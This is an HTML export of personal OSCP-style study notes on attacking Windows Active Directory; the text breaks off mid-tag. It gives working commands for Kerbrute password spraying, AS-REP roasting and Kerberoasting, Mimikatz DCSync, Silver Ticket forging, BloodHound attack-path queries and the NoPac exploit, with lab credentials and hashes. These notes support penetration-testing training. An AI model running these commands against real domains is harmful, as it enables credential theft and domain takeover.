<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Active Directory</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Active Directory</h1><br/><p><h1>Methodology</h1><ul><li>Combine these methods with those from basic <a href="PrivEsc--Windows_9.html">Windows</a> <a href="PrivEsc_8.html">PrivEsc</a> to pivot/compromise Domain Accts</li></ul></p><p><ul><li><span style="color:#cdab8f;text-decoration:underline;">★</span>Utilize <a href="Pivoting--AD_Lateral_Movement_39.html">AD Lateral Movement</a> techniques, which <span style="color:#ff0000;">could work even if you can&#39;t get RCE via traditional means</span> (e.g. <span style="color:#ff0000;">without RDP, WinRM, etc</span>)</li></ul></p><p><ul><li><span style="color:#ff0000;">Run SharpHound as every user on every host, &amp; use PS terminals</span><em><span style="color:#ff0000;"> Running as Admin</span></em> if possible. Using it in different contexts will provide different results. Should be able to upload each of the output files to BloodHound for a more complete picture.</li></ul></p><p><ul><li>Look for &amp; <span style="color:#ff0000;">Unroll any </span><a href="PrivEsc--Windows--Active_Directory_10.html#Nested Groups">Nested Groups</a>!</li></ul></p><p><ul><li>Sometimes <span style="color:#ff0000;">can&#39;t directly </span><a href="PrivEsc_8.html">PrivEsc</a>, &amp; instead need to <span style="color:#ff0000;">use user acct to pivot</span>. After compromising other machine(s), you may then have info or compro acct that lets you <a href="PrivEsc_8.html">PrivEsc</a> on OG machine. </li></ul></p><p><ul><li><span style="color:#ff0000;">Creds for the built-in local</span> <span style="color:#33d17a;">Administrator</span> Acct may be <span style="color:#ff0000;">re-used</span> accross diff hosts in the Dom!</li></ul></p><p><ul><li>If you have access to Local Acct, may be able to leverage it (e.g. Mimikatz) to <span style="color:#ff0000;">dump the Machine Acct&#39;s Hash</span> which is a <span style="color:#ff0000;">Domain Acct</span> that can be used for things like <span style="color:#ff0000;">Roasting</span>! </li></ul></p><p></p><p><h1>Domain Controller Enumeration</h1></p><p></p><p><a name="kerbrute"></a><h2>Kerbrute</h2><h1></h1></p><p><h1></h1>[OSCP 87-88]</p><p></p><p>Requires access to a DC, as it attacks Kerberos. Kerbrute is often quicker than other BF attacks due to mechanism used.</p><p></p><p>Has the following modules-</p><p><ul><li><strong>bruteuser</strong> - Bruteforce a single user&#39;s password from a wordlist</li><li><strong>bruteforce</strong> - Read username:password combos from a file or stdin and test them</li><li><strong>passwordspray</strong> - Test a single password against a list of users</li><li><strong>userenum</strong> - Enumerate valid domain usernames via Kerberos</li></ul></p><p></p><p>&quot;A domain (<strong>-d</strong>) or a domain controller (<strong>--dc</strong>) must be specified. If a Domain Controller is not given the KDC will be looked up via DNS.&quot; I specified both, but this doesn&#39;t seem to be required.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: Try using the Argus tool suite to simplify Kerbrute usage.</p><p></p><p><h3>User Enumeration</h3></p><p>Identify Domain Accounts. The domain can be found via SMB (but may not be neccesary if it can be auto looked up via DNS).</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: NOT case-sensitive, so it&#39;s more efficient to use a wordlist that doesn&#39;t repeat usernames in diff cases.</p><p></p><p><em>kerbrute userenum -d oscp.exam --dc IP /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt</em></p><p></p><p><span class="subheading">Service Accounts</span>: Often use a similar naming syntax (e.g <strong>sql_svc</strong>), so I created the following list to try- <a href="file:///usr/share/wordlists/seclists/Usernames/service_Accts_Windows.txt">/usr/share/wordlists/seclists/Usernames/service_Accts_Windows.txt</a></p><p></p><p><span style="color:#f66151;">★</span><span class="subheading">AS-REP Roasting</span>: Automatically checks any found usernames to see if they&#39;re vuln to AS-REP Roasting. ★<span style="color:#f66151;text-decoration:underline;">WARNING</span>★ I don&#39;t think it&#39;s in john format! <span style="color:#ff0000;">Unable to crack output hash</span> &amp; had to retrieve it with <a href="PrivEsc--Windows--Active_Directory_10.html#AS-REP Roasting">normal method</a>.</p><p></p><p><h3>Bruteforce User&#39;s Password (bruteuser)</h3></p><p>In one case it FAILED to identify creds (using Argus, but shouldn&#39;t matter?). Try running manually? <span style="color:#ff0000;">Don&#39;t blindly trust results</span>?</p><p></p><p><em>kerbrute bruteuser -d oscp.exam --dc IP /usr/share/wordlists/rockyou.txt betty</em></p><p></p><p><a name="KRB passwd spray"></a><h3>Password Spray</h3></p><p>Test a password against a list of accounts. For ex, to <span style="color:#ff0000;">check if a password is being re-used</span> by other accounts.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: Can use SMB&#39;s <a href="Recon_+_Services--SMB_11.html#IPC$ Enum">IPC$ Enumeration</a> to create a wordlist of users.</p><p></p><p><em>kerbrute passwordspray -d raz0rblack.thm --dc 10.10.240.94 /dev/shm/razorback/users.txt &#39;roastpotatoes&#39;</em></p><p></p><p><span class="subheading">Expired Password</span>: Other password spray methods (i.e CME) may fail to detect a passwd if it needs to be changed! Kerbrute will output the following.</p><p></p><p><strong>VALID LOGIN WITH ERROR:</strong> ....<strong> (User&#39;s password has expired)</strong></p><p></p><p>In this case, <span style="color:#ff0000;">YOU can change the password</span> for them with <a href="Recon_+_Services--SMB_11.html#Change Expired Password">impacket-smbpasswd</a>!</p><p></p><p><a name="LDAP Enum"></a><h2>LDAP</h2></p><p>[Win 58]</p><p></p><p>See <a href="Recon_+_Services--LDAP_106.html">LDAP</a>. You can be query LDAP using a host in the LAN (e.g SharpHound will do this automatically. Some of the Powersploit scripts may also), or it can be queried remotely if can access an LDAP Server (typically a DC).</p><p></p><p><h1>Domain Controller Exploitation</h1></p><p>[Win 85]</p><p>With direct access to a DC, you can test for the following exploits.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Q</span>: Are the CME detection modules reliable? They didn&#39;t work when I tried them previously.</p><p></p><p><h2>ZeroLogon</h2></p><p></p><p><h2>NoPac</h2></p><p>[Win 107-108]</p><p></p><p>Using the <span style="color:#ff0000;">creds for any Domain User</span>, get Admin access to the DC.</p><p></p><p>Can be exploited using <a href="file:///home/asura/git/noPac">PoC</a> from <a href="https://github.com/Ridter/noPac">Github</a> (see example in Windows book). Blog post with examples <a href="https://systemweakness.com/compromise-domain-with-nopac-exploit-f759b670fab1">here</a> &amp; further reading <a href="https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html">here</a>.</p><p></p><p><h3>Setup</h3></p><p>[Win 116]</p><p></p><p>Activate the <a href="Exploit_Research_3.html#python venv">Python Venv</a> to use the PoC tools.</p><p></p><p>To use a ticket for this tool, it must be in <strong>.ccache</strong> format &amp; exported as an env var.</p><p></p><p><span class="subheading">Obtaining Ticket</span>: The tool will attempt to get tickets in .ccache format, but you can also exfil tickets from a target &amp; convert them (e.g <em>impacket-ticketConverter ticket.kirbi ticket.ccache</em> ).</p><p></p><p><span class="subheading">Using Ticket</span>: <em>export KRB5CCNAME=/PATH/ticket.ccache</em></p><p></p><p><h3>Check for Vulnerability</h3></p><p>Idk the reliability of either method, but you can use CME &amp; possibly the scanner from the same Github Repo (never tried it). Another option is to just try exploitation if you&#39;ve Domain User creds &amp; access to DC.</p><p></p><p>crackmapexec smb DC_IP -u ‘USER’ -p ‘PASSWD’ -M nopac			(Re-run if you don&#39;t get any output! Valid creds should at least show an SMB login)</p><p></p><p><em>python3 scanner.py cgdomain.com/sanfeng:&#39;1qaz@WSX&#39; -dc-ip 10.211.55.203</em></p><p></p><p><h2>PetitPotam</h2></p><p></p><p><h1>Groups</h1></p><p><h2>List Group Descriptions</h2></p><p><em>Get-ADGroup -filter * -properties * |Select SAMAccountName, Description | Format-List</em></p><p></p><p><a name="Nested Groups"></a><h2>Nested Groups</h2></p><p>[Win 59-61]</p><p><span style="color:#ff0000;">Members of a Nested Group</span> will effectively be <span style="color:#ff0000;">treated as members of any parent groups</span>. Nested Group relationships won&#39;t be shown via conventional methods.</p><p></p><p>Easiest way to enumerate Nested Groups is with BloodHound, but can also be done manually.</p><p></p><p><h3>Manually List Nested Groups</h3></p><p>Use <a href="Appendix--Code_80.html#LDAPSearch">LDAP search script</a>.</p><p></p><p><h2>Privileged Groups</h2></p><p><h3>Backup Operators</h3></p><p>[CTF B 48-49]</p><p></p><p>privileges to read files, traverse directories, and backup everything. This includes files and folders on DCs.</p><p></p><p>This  means Backup Operators can backup the DC’s hard drive, make a copy of  ntds.dit and the system registry hive from the backup, and then move  both files offline and dump hashes.</p><p></p><p><h3>Account Operators</h3></p><p>Modify User Accounts that aren&#39;t in 1 of the default “Protected Groups” (Administrators, Server Operators, Account Operators, Backup Operators, or Print Operators groups).</p><p></p><p>Can&#39;t directly compromise a Domain Admin, but may let you compromise other accounts to indirectly get there.</p><p></p><p>Can <span style="color:#ff0000;">change user&#39;s passwords &amp; group membership</span> (e.g. <span style="color:#ff0000;">add them to WinRM group</span>).</p><p></p><p><span class="subheading">PrivEsc</span>: <a href="https://blog.cyberadvisors.com/technical-blog/blog/account-operators-privilege-escalation">Privilege Escalation</a>. May need to re<span style="color:#ff0000;">-run below commands</span> (idk why). Test access with <strong>nxc smb</strong>...</p><p></p><p><em>net user brittanycr password123! /domain</em><em></em></p><p><em>net localgroup &quot;Remote Management Users&quot; brittanycr /add</em>			(Or add to Domain group like <strong>Add-ADGroupMember -Identity &quot;Remote Management Users&quot; -Members brittanycr</strong> ? )</p><p></p><p><h1>Machine Accounts (aka Computer Accounts?)</h1></p><p>[CTF B 49-50]</p><p>Machine/Computer Accounts have auto generated passwds when they&#39;re first created, meaning the hash won&#39;t be crackable (&amp; <span style="color:#ff0000;">reverting machine for OSCP will mean new passwd</span>!).</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: Machine Accounts are often <span style="color:#ff0000;">Domain Accounts</span>, meaning that they can be used for things like <span style="color:#ff0000;">Kerberoasting</span>. You can dump the Machine Account Hash via Mimikatz!</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Q</span>: Is a Machine Acct the same as that machine&#39;s NT AUTHORITY\SYSTEM? I connected to my SMB Server using  NT AUTHORITY\SYSTEM &amp; captured NetNTLMv2 hash for MS01$ (The hostname was MS01)</p><p></p><p><h2>Duplicates?</h2></p><p>I&#39;ve had Mimikatz dump the same Machine Acct&#39;s username with diff NTLM hashes, &amp; only 1 of them was valid. Try them all.</p><p></p><p><h1>Hounds</h1></p><p>[Win 70-73 &amp; CTF B 33-35,47]</p><p><span style="color:#ff0000;">Diff results based on the context that SharHound is run from</span>. Uploading new zip file may remove markers like <strong>Owned</strong></p><p></p><p>Run from as many users &amp; machines as possible (using PS that&#39;s <strong>Run as Admin</strong>, if possible), then Upload all those zip files to BloodHound for a more complete view of Domain.</p><p></p><p>BloodHound doesn&#39;t seem to show machine accts, but don&#39;t overlook them as they can have high privs! (e.g names end with $ like- <strong>MS01$</strong>)</p><p></p><p>For ex, BloodHound may inacurately report that a user only has Local Admin on 1 machine depending on context that SharpHound is run from.</p><p></p><p><h2>SharpHound</h2></p><p><a href="file:///usr/lib/bloodhound/resources/app/Collectors/">/usr/lib/bloodhound/resources/app/Collectors/</a> SharpHound.ps1	(or SharpHound.exe if needed)</p><p></p><p><em>Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser</em></p><p><em>. .\SharpHound.ps1</em><em></em></p><p><em>Invoke-BloodHound -CollectionMethods All -OutputDirectory \users\public</em></p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: Even if a Dom Acct doesn&#39;t have RCE on a target, you can run SharpHound from a diff Acct <a href="PrivEsc--Windows--Active_Directory_10.html#sharphound creds">using the Dom Acct&#39;s creds</a>!</p><p></p><p><h3>SharpHound.exe</h3></p><p>May work (or at least provide error msg) where the PS ver doesn&#39;t. Diff syntax, view with --help. Specify CollectionMethods with -c</p><p></p><p><em>.\SharpHound.exe -c All --ldapusername USER --ldappassword PASS</em></p><p></p><p><a name="sharphound creds"></a><h3>Troubleshooting- </h3><strong><h3>Unable to connect to LDAP, verify your credentials</h3></strong></p><p><span class="subheading">Manually specify LDAP creds</span>: <span style="color:#ff0000;">Worked after I provided clear-txt creds</span> for another Domain User (maybe there was an issue bc I was originally running SharpHound from an Acct I accessed via evil-winrm PtH &amp; didn&#39;t have clear-txt passwd?)</p><p></p><p><em>Invoke-BloodHound -CollectionMethods All -LdapUsername web_svc -LdapPassword Diamond1 -OutputDirectory \Users\celia.almeda\Documents</em></p><p></p><p><span class="subheading">Newer SharpHound Version</span>: There are newer <a href="https://github.com/BloodHoundAD/SharpHound/releases/tag/v2.3.2">collectors</a> (SharpHound) in a diff repo than BloodHound, which allegedly may help. (Would SharpHound / BloodHound ver mismatch cause issues?)</p><p></p><p><h2>Start BloodHound</h2></p><p>After initial setup, (where you Nav to <a href="http://localhost:7474">http://localhost:7474</a>, sign in with def creds neo4j:neo4j then change the def passwd)</p><p></p><p><em>sudo neo4j start			</em><strong>	OR 		</strong><em>		sudo systemctl start neo4j			</em>(Depending on system may need to do one or the other)<em></em></p><p><em></em><em></em></p><p><em>bloodhound	</em>	(sign in with neo4j:NEW_PASSWD)</p><p></p><p>If the prev engagement&#39;s data is still saved (Bad OPSEC IRL!), remove it to start fresh-</p><p><strong>Clear Database</strong><strong></strong></p><p><strong>Clear Session</strong></p><p></p><p><strong>Upload Data</strong>	(Circle with Arrow)	Select .zip file</p><p></p><p><h2>BloodHound Abuse Tips</h2></p><p>BloodHound will tell you ways in which a Node property (i.e the line called an “edge”) or a Group can be abused.</p><p></p><p><h3>Edge</h3></p><p>Right Click the Edge → <strong>Help</strong></p><p></p><p>For example, <strong>HasSession</strong> can be leveraged for Password Theft or Token Impersonation.</p><p></p><p><h3>Group</h3></p><p>Click the Group&#39;s Node &amp; look under <strong>Node Info</strong> ↓ <strong>Node Properties</strong> ↓ <strong>Description</strong></p><p></p><p>★Remember to <span style="color:#ff0000;">manually check each Nested Group</span>!</p><p></p><p><h2>BloodHound Queries</h2></p><p>More on [CTF B 33-34]</p><p><ol><li>1) <h3>1)</h3><h3> Mark Owned Domain Principals</h3></li></ol></p><p>Also add any new Computer Hostnames to <strong>computers.txt</strong> &amp; any new Domain Users to <strong>usernames.txt</strong></p><p></p><p><span style="text-decoration:underline;">Raw Query</span>: <strong>MATCH (m:Computer) RETURN m</strong></p><p><span style="text-decoration:underline;">Raw Query</span>: <strong>MATCH (m:User) RETURN m</strong></p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: More queries for each Node (User or Computer) under the <strong>Node Info</strong> section.</p><p><ol><li>2) <h3>2) </h3><h3>Find Domain Admins</h3></li></ol></p><p><span style="text-decoration:underline;">Domain Info</span>: <strong>Find all Domain Admins</strong></p><p></p><p>R click &amp; <strong>Mark as High Value</strong></p><p><ol><li>3) <h3>3)</h3><h3> </h3><h3>List Active Sessions</h3></li></ol></p><p><span style="text-decoration:underline;">Raw Query</span>: <strong>MATCH p = (c:Computer)-[:HasSession]-&gt;(m:User) RETURN p</strong></p><p></p><p><h3>Shortest Paths</h3><ol><li><strong>To Domain Admins from Owned Principals</strong></li><li> (If nothing is returned from Prev Query) <strong>To Domain Admins</strong></li><li><strong>To Domain Admins from Kerberoastable Users</strong></li><li> <strong>From Domain Users to High Value Target</strong></li><li><strong>8) </strong>8) (If nothing is returned from Prev Query) <strong>To High Value Target</strong></li></ol><strong></strong></p><p><strong></strong><strong></strong></p><p><strong></strong><h3>Kerberos Interaction</h3><ol><li><strong>List all Kerberoastable Accounts</strong></li><li><strong>Find AS-REP Roastable Users</strong></li></ol><strong></strong></p><p><strong></strong><strong></strong></p><p><strong></strong><h3>Dangerous Privs</h3><ol><li><strong>Principals with DCSync Rights</strong></li><li><strong>12) </strong>12) <strong>Find Computers Where Domain Users are Local Admin  </strong> (Local Admins can Dump Hashes &amp; RCE by def: RDP, WinRm, etc)</li><li><strong>Find Workstations Where Domain Users can RDP</strong></li><li><strong>Find Servers Where Domain Users can RDP</strong></li></ol><strong></strong></p><p><strong></strong><strong></strong></p><p><strong></strong><h3>Enum Owned Users (Node Info)</h3></p><p>List all Users, Click on Owned Users, <strong>Node Info</strong> section, Run Queries like-</p><p><ol><li><strong>Unrolled Group Memberships</strong></li><li>Queries from <strong>OutBound Object Control </strong>section [Win 73]</li></ol><strong></strong></p><p><strong></strong></p><p><h1>Roasting</h1><h1></h1></p><p><h1></h1>[Win 89-</p><p></p><p>Try the Ares tool suite to simplify commands (must invoke full file path to wordlists, like <strong>/home/user/ </strong>&amp; not<strong> ~/</strong>)</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: You can <span style="color:#ff0000;">use a Machine Acct &amp; its hash for AD Auth to Roast!</span></p><p><h1></h1></p><p><h1></h1><h2>Troubleshooting</h2></p><p><span style="color:#ff0000;">Don&#39;t specify the @IP </span>like you do with other impacket tools! Just <span style="color:#ff0000;">rely on the -dc-ip IP</span>. For ex, the following FAILS-<h1></h1></p><p><h1></h1><h1></h1></p><p><h1></h1><em>impacket-GetUserSPNs medtech.com/joe:&#39;Flowers1&#39;</em><em><span style="color:#a51d2d;text-decoration:line-through;">@172.16.228.10</span></em><em><span style="color:#a51d2d;"> </span></em><em>-dc-ip 172.16.228.10 -request</em><h1></h1></p><p><h1></h1><h1></h1></p><p><h1></h1><a name="AS-REP Roasting"></a><h2>AS-REP Roasting</h2><h1></h1></p><p><h1></h1>[Win 89-91]</p><p><span style="color:#ff0000;">If you have creds for 1 user</span>, can <span style="color:#ff0000;">test all users</span> in the Domain. <span style="color:#ff0000;">If you don&#39;t have creds</span>, can <span style="color:#ff0000;">test a specific username or list of usernames</span>.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: If you ran w/o creds, <span style="color:#ff0000;">remember to rerun after obtaining creds</span>!</p><p></p><p><em>impacket-GetNPUsers medtech.com/joe:&#39;Flowers1&#39; -dc-ip 172.16.228.10 -request -format john</em><em></em></p><p><em></em><em></em></p><p><em>impacket-GetNPUsers raz0rblack.thm/twilliams -dc-ip 10.10.29.3 -request -format john -no-pass</em></p><p></p><p><h3>Using Wordlist</h3></p><p>For example, generate a list of domain users via SMB enumeration of <a href="Recon_+_Services--SMB_11.html#IPC$ Enum">IPC$ share</a>. Don&#39;t think you need<strong> -no-pass</strong> &amp; don&#39;t think the order of args matters here.</p><p></p><p><em>GetNPUsers.py -request -format john -usersfile users.txt -dc-ip enterprise.thm LAB-ENTERPRISE.THM/</em></p><p><h1></h1></p><p><h1></h1><h2>Kerberoasting</h2></p><p>[Win 91-93]</p><p></p><p><h3>Remote</h3></p><p>You <span style="color:#ff0000;">need</span> the credentials for a Domain User (either <span style="color:#ff0000;">password or NTLM</span> Hash).</p><p></p><p>impacket-GetUserSPNs medtech.com/joe:&#39;Flowers1&#39; -dc-ip 172.16.228.10 -request</p><p></p><p><em>impacket-GetUserSPNs &#39;oscp.exam/MS01$&#39; -dc-ip 10.10.89.152 -hashes :e5c5c40e8e6f2d7736d8f341bffbfef0 -request </em></p><p></p><p><em>john --format=krb5tgs</em> ... (rules: best64 [fast] or rockyou-30000 [slow but thorough])</p><p></p><p><h3>Local</h3></p><p>If you have a shell as a Domain User, you may be able to perform Kerberoasting <span style="color:#ff0000;">without knowing any credentials</span> using <a href="https://github.com/GhostPack/Rubeus?tab=readme-ov-file#kerberoast">Rubeus</a>. The most basic form of this attack is as follows.</p><p></p><p><em>.\Rubeus.exe kerberoast</em></p><p></p><p><a name="Mimikatz in AD"></a><h1>Mimikatz in AD</h1></p><p>See <a href="PrivEsc--Windows_9.html#Mimikatz">Basic Usage</a></p><p>[Win: Silver Ticket 94-95 , DCSync 99, OPtH &amp; PtT 118-120, Golden &amp; Diamond Ticket 123-126, Skeleton Key 128]</p><p></p><p>You may still need to start with <strong>privilege::debug</strong> for certain actions, but it&#39;s not necessary for everything.</p><p></p><p><span style="color:#f66151;text-decoration:underline;">IMPORTANT</span>: <span style="color:#ff0000;">DON&#39;T USE </span><strong><span style="color:#ff0000;">token::elevate</span></strong><span style="color:#ff0000;"> to perform DCSync</span> (or other AD tasks). You need a Domain Acct with required privs, &amp; DCSync can&#39;t be done by using a local machine&#39;s SYSTEM account.</p><p></p><p><strong>lsadump::dcsync</strong></p><p><em>Invoke-Mimikatz -Command &#39;&quot;lsadump::dcsync /all exit&quot;&#39;</em></p><p><strong></strong></p><p><strong>sekurlsa::tickets</strong></p><p><em> Invoke-Mimikatz -Command &#39;&quot;sekurlsa::tickets /export exit&quot;&#39;</em></p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: The <strong>crypto</strong> module lets you compromise certs which may help with things like MitM Attacks (but unlikely to be useful on OSCP?)</p><p></p><p><h1>Silver Ticket Attack</h1></p><p>[Win 93-96]</p><p><h2>Background</h2></p><p>An account&#39;s permissions listed in the service ticket (TGS) aren&#39;t usually verified by the App Server (Unless PAC Validation is enabled). Therefore, forging a TGS lets you <span style="color:#ff0000;">access otherwise inaccessible services</span>.</p><p></p><p>A Silver Ticker Attack uses concepts akin to a PtH Attack, &amp; can be leveraged against all servers that the SPN is used on.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: <strong>CIFS </strong>is a file share service, like <strong>SMB</strong> &amp; <strong>NFS</strong>. For more info, see this <a href="https://www.computerweekly.com/feature/NFS-vs-SMB-vs-CIFS-File-storage-protocols-defined">resource</a>.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Accessing MSSQL</span>: I believe that the value for<strong> /service:</strong> should be <strong><span style="color:#ff0000;">MSSQLSvc</span></strong>. (Double check this, haven&#39;t used it yet)</p><p></p><p><h3>Requirements</h3><ol><li>SPN / <span style="color:#ff0000;">Service Acct&#39;s NTLM</span> Hash (<span style="color:#ff0000;">OR a Kerberos Key</span> for this account). Don&#39;t need clear-txt passwd, but can use it to generate the corresponding NTLM hash.</li></ol></p><p></p><p>(e.g Use the creds from a successful Kerberoasting Attack, dump the creds with Mimikatz, etc.)</p><p><ol><li>Domain SID (Not incl a user&#39;s RID!)</li></ol></p><p><ol><li>Domain Name (incl the TLD, like corp.com) </li></ol></p><p><ol><li>Target SPN</li></ol></p><p></p><p><span class="subheading">Obtain Domain SID</span>: Mimikatz will output the Domain SID. Can also use <strong>whoami /user</strong>, but the last part of the SID will contain the user&#39;s RID. For example, take the bold excerpt from the output of whoami.</p><p></p><p><span style="text-decoration:underline;">User Name</span>		 <span style="text-decoration:underline;">SID</span></p><p>corp\jeff		 		<strong>S-1-5-21-1987370270-658905905-1781884369</strong>-1105</p><p></p><p><span class="subheading">Obtain Domain Name</span>: Many ways to get it (e.g SMB Enum), but you can use local access to run one of the following commands.</p><p></p><p><em>Get-ADDomain | select DNSRoot</em><em></em></p><p><em></em><em></em></p><p><em>systeminfo | findstr /B /C:&quot;Domain:&quot; </em></p><p></p><p><span class="subheading">Obtain Target SPN</span>: [Win 66] Use Kerberoasting, or one the following methods. Verify the SPN like- <strong>nslookup web04.corp.com</strong></p><p></p><p><strong>{LotL}</strong> Use <em>setspn.exe</em> to iterate through a list of Domain Users. Use <em>-L</em> to run it against both servers &amp; clients in the Domain. For ex, find the SPN linked to the iis_service account</p><p></p><p><em>setspn -L iis_service	</em>		(Output: HTTP/<strong>web04.corp.com</strong>:80)</p><p></p><p><strong>{PowerView}</strong> <em>Get-NetUser</em> will enum all accounts in the domain.</p><p></p><p><em>Get-NetUser -SPN | select samaccountname,serviceprincipalname</em></p><p></p><p><h3>Hash vs Kerberos Keys</h3></p><p>Instead of using the NTLM Hash, can also specify a Kerberos Key (des should be deprecated, but aes128 &amp; aes256 are actually BETTER for OPSEC than using the NTLM hash).</p><p></p><p>Use <strong>/rc4:</strong> for the NTLM Hash or the specify the type of key like<strong> /aes128:</strong> or <strong>/aes256:</strong></p><p></p><p><h2>Forge TGS</h2></p><p>Mimikatz&#39;s <strong>kerberos::golden</strong> Silver &amp; Golden tickets. Can <span style="color:#ff0000;">specify ANY Domain user</span> (even if you don&#39;t have access to that account), the App Server only checks to see if TGS is valid.</p><p></p><p>The ticket will be injected into RAM if you use <strong>/ptt</strong>, but won&#39;t be saved.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: To save the ticket in a file (e.g ticket.kirbi in the pwd) use<strong> /ticket:ticket.kirbi</strong> &amp; load it into RAM like <strong>kerberos::ptt C:\PATH\ticket.kirbi</strong>. This is easier than trying to deal with the odd ticket name syntax that&#39;s used by default.</p><p></p><p><em>kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin</em></p><p></p><p><h3>Verify</h3></p><p><span style="color:#ff0000;">In the same terminal</span>, <strong>exit</strong> Mimikatz &amp; run <strong>klist</strong> to view currently cached tickets.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: If you mess up &amp; the TGS is invalid, it will be automatically deleted when you try to use it.</p><p></p><p><h2>Ticket Naming Syntax</h2></p><p>Exported tickets have an odd filename by default. Mimikatz seems to handle them fine if you use quotes, but PS can have issues with it if you&#39;re trying to transfer the file (e.g. to Exfil the ticket).</p><p></p><p>One trick is to use Tab Complete to invoke the filename using the proper escape syntax. <a href="Appendix--Code--Powershell_83.html#Escaping Special Characters">Backticks</a> are used as escape characters in PS. For example, escape the brackets as follows.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Q</span>: I think this is what I used, saw posts saying this escape syntax sometimes only works inside 2x quotes. Is that accurate? Try 2x quotes if this doesn&#39;t work?</p><p></p><p><strong>[0;1e4c7df]-2-0-40e10000-joed@krbtgt-DOMAIN.COM.kirbi</strong></p><p></p><p>&#39;.\<strong><span style="color:#ff0000;">`</span></strong>[0;1e4c7df<strong><span style="color:#ff0000;">`</span></strong>]-2-0-40e10000-joed@krbtgt-DOMAIN.COM.kirbi’</p><p></p><p><h2>★</h2><h2>Abusing TGS</h2></p><p>[Win 114-120]</p><p></p><p>This depends on the type of service you&#39;re trying to access. </p><p></p><p>Some CLi tools will automatically try to use the tickets in RAM, whereas others only use them if a specific arg is supplied (i.e iwr).</p><p></p><p><span style="color:#060f94;">★</span> See <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket">Hacktricks</a> for a <span style="color:#ff0000;">list of services &amp; ways to abuse a TGS</span> for them!</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: If client has <span style="color:#ff0000;">PSExec</span> installed, that&#39;s often a good way to leverage a TGS, but <span style="color:#ff0000;">MUST </span>use target&#39;s<span style="color:#ff0000;"> HOSTNAME</span>. If the <span style="color:#ff0000;">IP address is used</span>, PSExec uses the <span style="color:#ff0000;">current NTLM Hash</span>!</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Q</span>: Don&#39;t use <strong>token::elevate</strong> for mimikatz? Wont get ticket maybe? Need TGT for psexec?</p><p></p><p><h3>HTTP</h3></p><p>Browsers won&#39;t use Silver Tickets by def, so you can access a Web App via PS session which has the imported ticket.</p><p></p><p><em>iwr -UseDefaultCredentials</em> lets you use the TGS, provided that the site has <strong>Windows Authentication</strong> Enabled (In an AD env, it probably will be enabled).</p><p></p><p><span class="subheading">View all Fields</span>: Some data (e.g Headers) may be cutoff unless you append <strong>| Format-List</strong>.</p><p></p><p><em>iwr -UseDefaultCredentials http://web04 | select -Expand Content</em>				(Identical to the following command)</p><p></p><p><em>(iwr -UseDefaultCredentials http://web04).Content</em></p><p></p><p><span class="subheading">Specific Fields</span>: Examples incl <strong>.Headers</strong> &amp; <strong>.RawContent</strong> (All HTML &amp; Headers from the Response).</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Q</span>: Is it true that a TGS for HTTP SPN can be <span style="color:#ff0000;">used for RCE</span> (e.g WinRM &amp; PS Remoting)? See aforementioned Hacktricks link.</p><p></p><p><h3>CIFS</h3></p><p>Interact with <span style="color:#ff0000;">Network Shares</span> using basic commands like <strong>dir</strong> &amp; <strong>copy</strong>.</p><p></p><p>Some PowerView cmdlets will also utilize tickets, like <a href="https://www.netwrix.com/silver_ticket_attack_forged_service_tickets.html">Find-InterestingFile</a>.</p><p></p><p><h3>HOST</h3></p><p>Create scheduled tasks for RCE.</p><p></p><p>There are also other methods of RCE using a <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket#host">Host TGS</a> (e.g. if this user can&#39;t create scheduled tasks on target machine)</p><p></p><p><h3>LDAP</h3></p><p>Perform DCSync Attack?</p><p></p><p><h3>Attacker&#39;s Machine</h3></p><p>If you saved the ticket &amp; exported it to your machine, it can then be passed to various tools. The arg is typically <strong>-k</strong> (e.g for impacket).</p><p></p><p>Must first convert them from Windows format (<strong>.kirbi</strong>) to Linux format (<strong>.ccache</strong>)</p><p></p><p><em>impacket-ticketConverter ticket.kirbi ticket.ccache</em>		(Or vice versa to convert ticket to Windows format)</p><p></p><p><a name="OPtH"></a><h1>OverPass the Hash (OPtH)</h1></p><p>[Win 118-119, Wreath 118]</p><p></p><p>With a basic PtH Attack you&#39;re limited to only using NetNTLM protocol, but OPtH lets you <span style="color:#ff0000;">turn an NTLM Hash into a Kerberos TGT</span>.</p><p></p><p>Using <span style="color:#ff0000;">KRB Auth gives you more options</span> (e.g RCE via <a href="Pivoting--AD_Lateral_Movement_39.html#psexec OPtH">PSExec.exe</a> which doesn&#39;t accept passwd hashes).</p><p></p><p>A TGT will work on any host in the Domain, unlike a TGS which only grants access to the machine that has the target resource.</p><p></p><p><h2>Requirements</h2></p><p><span style="color:#ff0000;">Admin privs aren&#39;t needed</span> for OPtH. You just need a way to request a TGT, which can be done locally on a Domain joined Windows host or remotely (e.g. via Impacket).</p><p></p><p><h2>Obtain TGT</h2></p><p>You can either use <a 